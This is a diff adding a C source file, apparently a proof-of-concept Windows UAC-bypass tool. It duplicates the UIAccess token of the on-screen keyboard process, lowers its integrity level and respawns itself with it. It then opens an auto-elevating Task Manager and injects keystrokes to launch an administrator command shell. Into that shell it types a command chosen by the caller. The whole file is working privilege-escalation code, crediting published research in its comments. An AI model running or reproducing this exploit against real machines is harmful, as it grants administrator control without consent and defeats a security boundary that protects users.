@@ -1,0 +1,243 @@
+#include "Windows.h"
+#include "stdio.h"
+#include "sddl.h"
+#include "strsafe.h"
+
+DWORD SetTokenIntegrityLevelMedium(HANDLE token);
+
+int wmain(int argc, wchar_t** argv)
+{
+	wchar_t defaultCmdline[] = L"cmd /c echo TaskManagerSecret > C:\\Windows\\byeuac.txt && notepad.exe C:\\Windows\\byeuac.txt && exit";
+	wchar_t* cmdline = defaultCmdline;
+	BOOL processHasUIAccess = FALSE;
+
+	if (argc == 2 && wcscmp(argv[1], L"UIAccess") == 0)
+		processHasUIAccess = TRUE;
+
+	if (argc > 2) {
+		cmdline = argv[1];
+		if (wcscmp(argv[2], L"UIAccess") == 0)
+			processHasUIAccess = TRUE;
+	}
+
+	SHELLEXECUTEINFO shinfo;
+	RtlZeroMemory(&shinfo, sizeof(shinfo));
+	shinfo.cbSize = sizeof(shinfo);
+	shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+	shinfo.nShow = SW_HIDE;
+
+	if (processHasUIAccess) {
+		// we expect now to have the UIAccess flag set in our current process token
+		// in this way we are able to bypass UIPI, so it means we can use SendInput() on windows of higher IL processes
+		wchar_t taskmgmrPath[] = L"C:\\Windows\\System32\\taskmgr.exe";
+		HWND hWndTaskmgr, hWndCmd;
+
+		shinfo.lpFile = taskmgmrPath;
+
+		// execute task manager through appinfo service so it can auto elevate
+		if (!ShellExecuteEx(&shinfo)) {
+			printf("ShellExecuteEx failed with error code %d", GetLastError());
+			exit(-1);
+		}
+
+		Sleep(1000);
+		hWndTaskmgr = FindWindow(NULL, L"Task Manager");
+
+		if (hWndTaskmgr == NULL) {
+			printf("Task Manager window not found\n");
+			exit(-1);
+		}
+		printf("Task Manager window found\n");
+		if (!SetForegroundWindow(hWndTaskmgr)) {
+			printf("SetForegroundWindow failed with error code %d\n", GetLastError());
+			exit(-1);
+		}
+
+		INPUT input;
+		input.type = INPUT_KEYBOARD;
+		input.ki.time = 0;
+		input.ki.dwExtraInfo = 0;
+		input.ki.wScan = 0;
+		input.ki.dwFlags = 0;
+
+		// interact with task manager window to send tab -> space to press on "More details"
+
+		// Tab Key Down 
+		input.ki.wVk = VK_TAB;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Tab Key Up 
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+
+		// Space Key Down 
+		input.ki.wVk = VK_SPACE;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Space Key Up
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+
+		// send alt -> enter -> ctrl+enter to navigate to File -> "Run New Task" -> elevated cmd shell
+		// as mentioned here --> https://twitter.com/splinter_code/status/1695839278176108735
+
+		// Alt Key Down 
+		input.ki.wVk = VK_LMENU;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Alt Key Up
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+
+		// Enter Key Down 
+		input.ki.wVk = VK_RETURN;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Enter Key Up
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+
+		// Ctrl Key Down 
+		input.ki.wVk = VK_CONTROL;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Enter Key Down 
+		input.ki.wVk = VK_RETURN;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Ctrl Key Up
+		input.ki.wVk = VK_CONTROL;
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+		// Enter Key Up
+		input.ki.wVk = VK_RETURN;
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+
+		// kill the task manager
+		Sleep(1000);
+		TerminateProcess(shinfo.hProcess, 0);
+		CloseHandle(shinfo.hProcess);
+
+		// Find the window of the new High IL cmd.exe spawned by the task manager
+		hWndCmd = FindWindow(NULL, L"Administrator: C:\\WINDOWS\\system32\\cmd.exe");
+		if (hWndCmd == NULL) {
+			printf("High IL cmd.exe window not found\n");
+			exit(-1);
+		}
+		printf("High IL cmd.exe window found\n");
+		if (!SetForegroundWindow(hWndCmd)) {
+			printf("SetForegroundWindow failed with error code %d\n", GetLastError());
+			exit(-1);
+		}
+		HKL kl = GetKeyboardLayout(0);
+		BOOL NeedShift = FALSE;
+		WORD VkAndShift = 0;
+		// sending the keystrokes of the commandline to the High IL cmd.exe
+		for (int i = 0; i < wcslen(cmdline); i++) {
+			VkAndShift = VkKeyScanEx(cmdline[i], kl);
+			NeedShift = ((HIBYTE(VkAndShift) & 1) == 1);
+			if (NeedShift) {
+				input.ki.wVk = VK_SHIFT;
+				input.ki.dwFlags = 0;
+				SendInput(1, &input, sizeof(INPUT));
+			}
+			input.ki.wVk = LOBYTE(VkAndShift);
+			input.ki.dwFlags = 0;
+			SendInput(1, &input, sizeof(INPUT));
+			input.ki.dwFlags = KEYEVENTF_KEYUP;
+			SendInput(1, &input, sizeof(INPUT));
+			if (NeedShift) {
+				input.ki.wVk = VK_SHIFT;
+				input.ki.dwFlags = KEYEVENTF_KEYUP;
+				SendInput(1, &input, sizeof(INPUT));
+			}
+		}
+
+		// Enter Key Down 
+		input.ki.wVk = VK_RETURN;
+		input.ki.dwFlags = 0;
+		SendInput(1, &input, sizeof(INPUT));
+		// Enter Key Up
+		input.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &input, sizeof(INPUT));
+
+		printf("The string '%S' has been sent to the High IL cmd.exe!\n", cmdline);
+	}
+	else
+	{
+		// The core of this hack is stealing and using a token containing the UIAccess flag set
+		// Trick described by James Forshaw here, so all credits to him --> https://www.tiraniddo.dev/2019/02/accessing-access-tokens-for-uiaccess.html
+
+		HANDLE hProcessToken, hDuplicateToken;
+		wchar_t oskPath[] = L"C:\\Windows\\System32\\osk.exe";
+		wchar_t cmdlineTemplate[] = L"%s UIAccess";
+		wchar_t moduleFilename[MAX_PATH], newCmdline[MAX_PATH];
+
+		shinfo.lpFile = oskPath;
+
+		if (!ShellExecuteEx(&shinfo)) {
+			printf("ShellExecuteEx failed with error code %d", GetLastError());
+			exit(-1);
+		}
+
+		if (!OpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken)) {
+			printf("OpenProcessToken failed with error code %d", GetLastError());
+			exit(-1);
+		}
+
+		if (!DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
+			printf("DuplicateTokenEx failed with error code %d", GetLastError());
+			exit(-1);
+		}
+
+		CloseHandle(hProcessToken);
+		TerminateProcess(shinfo.hProcess, 0);
+		CloseHandle(shinfo.hProcess);
+
+		if (SetTokenIntegrityLevelMedium(hDuplicateToken)) {
+			printf("SetTokenIntegrityLevelMedium failed with error code %d", GetLastError());
+			exit(-1);
+		}
+
+		PROCESS_INFORMATION pi;
+		STARTUPINFO si;
+		RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		RtlZeroMemory(&si, sizeof(STARTUPINFO));
+		si.cb = sizeof(STARTUPINFO);
+
+		GetModuleFileName(NULL, moduleFilename, MAX_PATH);
+		StringCchPrintfW(newCmdline, MAX_PATH, cmdlineTemplate, GetCommandLine());
+
+		if (!CreateProcessAsUser(hDuplicateToken, moduleFilename, newCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+		{
+			printf("CreateProcessAsUserW failed with error code %d", GetLastError());
+			exit(-1);
+		}
+		printf("Current process respawned with UIAccess flag\n");
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+	}
+	return 0;
+}
+
+
+DWORD SetTokenIntegrityLevelMedium(HANDLE token) {
+	PSID medium_sid = NULL;
+	if (!ConvertStringSidToSid(SDDL_ML_MEDIUM_PLUS, &medium_sid)) {
+		return GetLastError();
+	}
+	TOKEN_MANDATORY_LABEL label = { 0 };
+	label.Label.Attributes = SE_GROUP_INTEGRITY;
+	label.Label.Sid = medium_sid;
+	size_t size = sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(medium_sid);
+	BOOL success = SetTokenInformation(token, TokenIntegrityLevel, &label, size);
+	if (!success) {
+		printf("SetTokenInformation failed with error code %d", GetLastError());
+		exit(-1);
+	}
+	DWORD result = success ? ERROR_SUCCESS : GetLastError();
+	LocalFree(medium_sid);
+	return result;
+}
